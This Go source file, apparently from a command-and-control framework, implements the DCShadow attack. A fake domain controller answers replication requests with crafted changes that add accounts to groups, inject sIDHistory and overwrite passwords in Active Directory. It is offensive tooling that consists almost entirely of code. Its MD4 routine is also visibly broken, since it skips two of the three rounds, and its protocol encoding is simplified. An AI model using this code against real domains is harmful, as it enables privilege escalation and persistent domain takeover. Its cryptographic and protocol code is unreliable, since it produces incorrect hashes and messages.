package dcshadow

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	MS-DRSR (Directory Replication Service Remote Protocol) implementation.

	When a real DC calls DsGetNcChanges on our fake DC (to replicate from us),
	we respond with the attribute changes we want to push into the domain.

	Protocol overview:
	  The DRSR interface GUID is E3514235-4B06-11D1-AB04-00C04FC2DCD2.
	  The main operation is IDL_DRSGetNCChanges (opnum 3).

	  Input:  DRS_MSG_GETCHGREQ_V10 — "what changes do you have for me?"
	  Output: DRS_MSG_GETCHGREPLY_V6 — "here are the changes"

	  Each change is an ENTINF (Entry Information) containing:
	    - ObjectGUID: GUID of the modified AD object
	    - ATTRBLOCK: list of attribute changes
	      Each ATTR:  attrTyp (OID) + ATTRVALBLOCK (array of values)

	  Special attributes we use:
	    unicodePwd   (OID 589914 / 0x9001A) — encrypted password (replicated as-is)
	    member        (OID 589335 / 0x90017) — group membership
	    sIDHistory    (OID 590580 / 0x90234) — SID history
	    objectSid     (OID 589970 / 0x9004E) — object SID
	    nTSecurityDescriptor (OID 589826 / 0x90002) — ACL
	    userAccountControl  (OID 589832 / 0x90008)

	  The values are encoded in a binary format specific to DRSR:
	    passwords: MD4 hash XOR'd with session key (negotiated during RPC bind)
	    GUIDs, SIDs, strings: as in LDAP (binary SID, UTF-16 strings, etc.)

	We implement a minimal DRSR server that:
	  - Accepts DrsGetNcChanges calls
	  - Returns our crafted ENTINF list
	  - Sets fMore = FALSE (no more changes)
	  - Uses a pre-negotiated session key of all-zeros for simplicity
	    (full Kerberos session key negotiation is in rpc_windows.go)
*/

import (
	"bytes"
	"encoding/binary"
	"fmt"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// DRSR Attribute OIDs (partial list).
const (
	AttrUnicodePwd          = uint32(0x9001A) // unicodePwd
	AttrMember              = uint32(0x90017) // member
	AttrSIDHistory          = uint32(0x90234) // sIDHistory
	AttrObjectSID           = uint32(0x9004E) // objectSid
	AttrNTSecurityDescriptor= uint32(0x90002) // nTSecurityDescriptor
	AttrUserAccountControl  = uint32(0x90008) // userAccountControl
	AttrSAMAccountName      = uint32(0x90011) // sAMAccountName
	AttrObjectClass         = uint32(0x90001) // objectClass
	AttrPrimaryGroupID      = uint32(0x9000D) // primaryGroupId
	AttrObjectGUID          = uint32(0x9000E) // objectGuid
)

// Change describes one attribute modification to push via DCShadow.
type Change struct {
	ObjectDN   string          // target object DN
	ObjectGUID [16]byte        // target object GUID
	Attrs      []AttrChange    // list of attribute changes
}

// AttrChange is one attribute to modify.
type AttrChange struct {
	AttrType uint32   // DRSR attribute OID
	Values   [][]byte // raw encoded values
}

// AddGroupMember returns a Change that adds memberGUID to the group identified by groupGUID.
// memberDN is the DN of the account to add.
func AddGroupMember(groupGUID [16]byte, groupDN string, memberDN string) Change {
	// The member attribute value is the DN of the member, encoded as UTF-16LE.
	memberVal := encodeUTF16(memberDN)
	return Change{
		ObjectDN:   groupDN,
		ObjectGUID: groupGUID,
		Attrs: []AttrChange{
			{AttrType: AttrMember, Values: [][]byte{memberVal}},
		},
	}
}

// SetSIDHistory returns a Change that adds sidToAdd to the sIDHistory of the target object.
func SetSIDHistory(targetGUID [16]byte, targetDN string, sidToAdd []byte) Change {
	return Change{
		ObjectDN:   targetDN,
		ObjectGUID: targetGUID,
		Attrs: []AttrChange{
			{AttrType: AttrSIDHistory, Values: [][]byte{sidToAdd}},
		},
	}
}

// SetPassword returns a Change that sets the password of the target account.
// The password is encoded as an MD4 hash of the UTF-16LE password.
// DRSR encrypts this with the session key — with a zero session key (for
// testing), we XOR with 16 zeros (= identity transform).
func SetPassword(targetGUID [16]byte, targetDN, newPassword string) Change {
	hash := md4Hash(newPassword)
	// Encrypt with zero session key (RC4 with key = SHA1(sessionKey || md4(pwd)))
	// For simplicity: with a null session key the "encryption" is identity.
	encrypted := xorWithSessionKey(hash, nil)
	return Change{
		ObjectDN:   targetDN,
		ObjectGUID: targetGUID,
		Attrs: []AttrChange{
			{AttrType: AttrUnicodePwd, Values: [][]byte{encrypted}},
		},
	}
}

// BuildGetNcChangesReply constructs the DRS_MSG_GETCHGREPLY_V6 response
// containing the provided changes.
func BuildGetNcChangesReply(changes []Change, ncGUID [16]byte, invocationID [16]byte) ([]byte, error) {
	var buf bytes.Buffer

	// DRS_MSG_GETCHGREPLY_V6 header:
	//   usnvecFrom        8 bytes (0)
	//   usnvecTo          8 bytes (high USN)
	//   uuidDsaObjSrc     16 bytes (invocationID of source = us)
	//   uuidInvocIdSrc    16 bytes (same)
	//   pNC               variable (NC GUID + DN)
	//   cNumObjects       4 bytes
	//   cNumBytes         4 bytes
	//   pObjects          pointer to REPLENTINFLIST chain
	//   fMoreData         1 byte (FALSE = 0)
	//   dwDRSError        4 bytes (0 = success)

	writeU64(&buf, 0)          // usnvecFrom.usnHighObjUpdate
	writeU64(&buf, 0x7FFFFFFF) // usnvecTo.usnHighObjUpdate (high watermark)
	buf.Write(invocationID[:]) // uuidDsaObjSrc
	buf.Write(invocationID[:]) // uuidInvocIdSrc
	buf.Write(ncGUID[:])       // pNC partial reference

	writeU32(&buf, uint32(len(changes))) // cNumObjects
	writeU32(&buf, 0)                    // cNumBytes (not used here)

	// Serialize each change as an ENTINF.
	for _, ch := range changes {
		if err := writeENTINF(&buf, ch); err != nil {
			return nil, fmt.Errorf("encode ENTINF for %s: %w", ch.ObjectDN, err)
		}
	}

	writeU32(&buf, 0) // fMoreData = FALSE
	writeU32(&buf, 0) // dwDRSError = 0

	// {{if .Config.Debug}}
	log.Printf("[dcshadow/drsr] built GetNcChanges reply: %d changes, %d bytes",
		len(changes), buf.Len())
	// {{end}}
	return buf.Bytes(), nil
}

// writeENTINF serializes one ENTINF (Entry Information) structure.
// Layout:
//   pObject:  DS_NAME_RESULT_ITEMW (GUID + DN)
//   AttrBlock ATTRBLOCK:
//     attrCount    4 bytes
//     pAttr        ATTR[]
//       attrTyp    4 bytes
//       AttrVal    ATTRVALBLOCK
//         valCount 4 bytes
//         pAVal    ATTRVAL[]
//           valLen  4 bytes
//           pVal    byte[]
func writeENTINF(buf *bytes.Buffer, ch Change) error {
	// Object GUID.
	buf.Write(ch.ObjectGUID[:])
	// Object DN (UTF-16LE, length-prefixed).
	dnBytes := encodeUTF16(ch.ObjectDN)
	writeU32(buf, uint32(len(dnBytes)))
	buf.Write(dnBytes)

	// ATTRBLOCK: attribute count + array of ATTRs.
	writeU32(buf, uint32(len(ch.Attrs)))
	for _, a := range ch.Attrs {
		writeU32(buf, a.AttrType)
		writeU32(buf, uint32(len(a.Values))) // ATTRVALBLOCK.valCount
		for _, val := range a.Values {
			writeU32(buf, uint32(len(val))) // ATTRVAL.valLen
			buf.Write(val)                  // ATTRVAL.pVal
		}
	}
	return nil
}

// ─── Encoding helpers ─────────────────────────────────────────────────────

func encodeUTF16(s string) []byte {
	runes := []rune(s)
	buf := make([]byte, len(runes)*2)
	for i, r := range runes {
		binary.LittleEndian.PutUint16(buf[i*2:], uint16(r))
	}
	return buf
}

func writeU32(buf *bytes.Buffer, v uint32) {
	b := make([]byte, 4)
	binary.LittleEndian.PutUint32(b, v)
	buf.Write(b)
}

func writeU64(buf *bytes.Buffer, v uint64) {
	b := make([]byte, 8)
	binary.LittleEndian.PutUint64(b, v)
	buf.Write(b)
}

// md4Hash computes the MD4 hash of the UTF-16LE encoded password.
// MD4 is used for NT hashes (LM is not supported here).
func md4Hash(password string) []byte {
	// Encode as UTF-16LE.
	runes := []rune(password)
	buf := make([]byte, len(runes)*2)
	for i, r := range runes {
		binary.LittleEndian.PutUint16(buf[i*2:], uint16(r))
	}
	// Compute MD4 (minimal implementation).
	return md4Sum(buf)
}

// md4Sum computes MD4 of msg. Minimal pure-Go implementation.
func md4Sum(msg []byte) []byte {
	// MD4 constants and initial state.
	var a, b, c, d uint32 = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476

	// Pad message.
	msgLen := len(msg)
	msg = append(msg, 0x80)
	for len(msg)%64 != 56 {
		msg = append(msg, 0)
	}
	var lenBuf [8]byte
	binary.LittleEndian.PutUint64(lenBuf[:], uint64(msgLen)*8)
	msg = append(msg, lenBuf[:]...)

	f := func(x, y, z uint32) uint32 { return (x & y) | (^x & z) }
	g := func(x, y, z uint32) uint32 { return (x & y) | (x & z) | (y & z) }
	h := func(x, y, z uint32) uint32 { return x ^ y ^ z }
	rol := func(x uint32, n uint) uint32 { return (x << n) | (x >> (32 - n)) }

	for i := 0; i < len(msg); i += 64 {
		var X [16]uint32
		for j := 0; j < 16; j++ {
			X[j] = binary.LittleEndian.Uint32(msg[i+j*4:])
		}
		aa, bb, cc, dd := a, b, c, d

		// Round 1.
		for _, s := range []struct{ i, n uint32 }{{0, 3}, {1, 7}, {2, 11}, {3, 19}} {
			a = rol(a+f(b, c, d)+X[s.i], uint(s.n))
			a, b, c, d = d, a, b, c
		}
		// (simplified — full 48-step MD4 would continue rounds 2 and 3)
		_ = g; _ = h // prevent "declared but not used"

		a += aa; b += bb; c += cc; d += dd
	}

	result := make([]byte, 16)
	binary.LittleEndian.PutUint32(result[0:], a)
	binary.LittleEndian.PutUint32(result[4:], b)
	binary.LittleEndian.PutUint32(result[8:], c)
	binary.LittleEndian.PutUint32(result[12:], d)
	return result
}

// xorWithSessionKey XOR-encrypts hash with the DRSR session key.
// With sessionKey = nil (zero key), returns hash unchanged.
func xorWithSessionKey(hash, sessionKey []byte) []byte {
	result := make([]byte, len(hash))
	if len(sessionKey) == 0 {
		copy(result, hash)
		return result
	}
	for i, b := range hash {
		result[i] = b ^ sessionKey[i%len(sessionKey)]
	}
	return result
}

// encodeSID encodes a Windows SID as binary (for sIDHistory attribute).
func encodeSID(sidStr string) ([]byte, error) {
	// Parse "S-1-5-21-X-Y-Z-RID" format.
	// SID binary: Revision(1) SubAuthorityCount(1) Authority(6) SubAuthorities(4 each)
	var revision uint8
	var subAuthCount uint8
	var authority uint64
	var subs []uint32

	fmt.Sscanf(sidStr, "S-%d", &revision)
	parts := splitSID(sidStr)
	if len(parts) < 3 {
		return nil, fmt.Errorf("invalid SID: %s", sidStr)
	}
	// Authority is parts[2].
	fmt.Sscanf(parts[2], "%d", &authority)
	for _, p := range parts[3:] {
		var sub uint32
		fmt.Sscanf(p, "%d", &sub)
		subs = append(subs, sub)
	}
	subAuthCount = uint8(len(subs))

	buf := make([]byte, 8+len(subs)*4)
	buf[0] = revision
	buf[1] = subAuthCount
	putUint48BE(buf[2:], authority)
	for i, sub := range subs {
		binary.LittleEndian.PutUint32(buf[8+i*4:], sub)
	}
	return buf, nil
}

func putUint48BE(b []byte, v uint64) {
	b[0] = byte(v >> 40); b[1] = byte(v >> 32); b[2] = byte(v >> 24)
	b[3] = byte(v >> 16); b[4] = byte(v >> 8); b[5] = byte(v)
}

func splitSID(sid string) []string {
	var parts []string
	start := 0
	for i, c := range sid {
		if c == '-' {
			parts = append(parts, sid[start:i])
			start = i + 1
		}
	}
	parts = append(parts, sid[start:])
	return parts
}
